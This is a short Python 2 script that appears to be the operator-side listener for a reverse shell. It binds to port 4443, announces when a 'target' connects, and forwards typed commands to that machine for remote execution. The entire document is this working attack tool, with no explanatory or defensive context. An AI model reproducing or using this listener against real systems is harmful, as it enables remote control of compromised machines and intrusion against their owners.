from socket import *
import sys

HOST = ''
PORT = 4443

S = socket(AF_INET, SOCK_STREAM)
S.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
S.bind((HOST, PORT))

print "LISTENING ON 0.0.0.0:%s" % str(PORT)

S.listen(10)
(client, (ip, port)) = S.accept()

print "TARGET CONNECTED BY ", ip

while True:
    data = client.recv(1024)

    cmd = raw_input(data)

    if cmd == 'quit' or cmd == 'q':
        break

    if cmd == 'exit':
        break

    if cmd:
        client.sendall('{}\n'.format(cmd).encode('utf-8'))
    else:
        continue
client.close()
